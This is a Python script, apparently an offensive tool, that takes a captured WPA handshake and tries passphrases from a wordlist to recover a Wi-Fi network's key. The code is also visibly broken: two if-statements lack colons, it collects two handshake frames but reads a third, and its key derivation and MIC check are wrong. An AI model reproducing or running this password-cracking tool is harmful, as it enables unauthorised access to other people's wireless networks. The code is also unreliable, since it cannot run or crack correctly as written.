import argparse
import hashlib
import hmac
import binascii
from scapy.all import rdpcap, Dot11, EAPOL
import time

def parse_args():
    parser = argparse.ArgumentParser(description="WPA Handshake Cracker")
    parser.add_argument("-P", "--wordlist", required=True, help="Path to the wordlist file")
    parser.add_argument("-f", "--file", required=True, help="Path to the .cap/.pcap file containing the handshake")
    return parser.parse_args()

def pbkdf2_hmac_sha1(passphrase, ssid, iterations=4096, dklen=32):
    # Combine passphrase and SSID to derive PSK using PBKDF2-HMAC-SHA1
    return hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), iterations, dklen)

def derive_ptk(pmk, anonce, snonce, mac_ap, mac_sta):
    # Derive PTK (Pairwise Transient Key) using PMK, ANonce, SNonce, and MAC addresses
    ptk_input = min(mac_ap, mac_sta) + max(mac_ap, mac_sta) + min(anonce, snonce) + max(anonce, snonce)
    return hmac.new(pmk, ptk_input.encode(), hashlib.sha1).digest()

def extract_handshake(pcap_file):
    # Extract the 4-way handshake (only EAPOL packets)
    packets = rdpcap(pcap_file)
    handshake = []
    for packet in packets:
        if packet.haslayer(EAPOL):
            handshake.append(packet)
        if len(handshake) == 2:  # We only need 4 EAPOL packets for the full handshake
            break
    return handshake

def print_live_updates(pmk, ptk, eapol_hmac):
    print(f"\nPMK: {binascii.hexlify(pmk).upper()}")
    print(f"PTK: {binascii.hexlify(ptk).upper()}")
    print(f"EAPOL HMAC: {binascii.hexlify(eapol_hmac).upper()}")

def attack(handshake, wordlist, ssid):
    # Process handshake
    ap_mac = handshake[0].addr2  # AP MAC address
    sta_mac = handshake[1].addr2  # Station MAC address
    anonce = handshake[0][EAPOL].load[13:29]  # AP Nonce (ANonce)
    snonce = handshake[1][EAPOL].load[13:29]  # Station Nonce (SNonce)

    # Iterate over wordlist to try passphrases
    with open(wordlist, 'r') as file:
        for line in file:
            passphrase = line.strip()
            pmk = pbkdf2_hmac_sha1(passphrase, ssid)  # Derive PMK from passphrase and SSID
            ptk = derive_ptk(pmk, anonce, snonce, ap_mac, sta_mac)  # Derive PTK from PMK
            eapol_hmac = hmac.new(ptk[:16], handshake[2][EAPOL].load, hashlib.sha1).digest()  # EAPOL HMAC
            
            print_live_updates(pmk, ptk, eapol_hmac)
            
            # Check if derived HMAC matches with the one in the handshake
            if eapol_hmac == handshake[2][EAPOL].load[0:16]:
                print(f"KEY FOUND! [{passphrase}]")
                break

def main():
    args = parse_args()
    
    # Read handshake from the pcap file
    print(f"Reading handshake from {args.file}...")
    handshake = extract_handshake(args.file)
    
    if len(handshake) < 2
        print("Error: Less than 4 EAPOL frames found. A full handshake is required.")
        return
    
    # Display available networks if more than one
    if len(handshake) > 1
        print("Multiple networks found:")
        for i, packet in enumerate(handshake):
            print(f"{i+1}. {packet.addr2} - {packet.info.decode()}")
        
        index = int(input("Index number of target network? ")) - 1
        ssid = handshake[index].info.decode()
    else:
        ssid = handshake[0].info.decode()

    # Attack: Start cracking with wordlist
    print(f"Starting attack on {ssid}...")
    attack(handshake, args.wordlist, ssid)

if __name__ == "__main__":
    main()
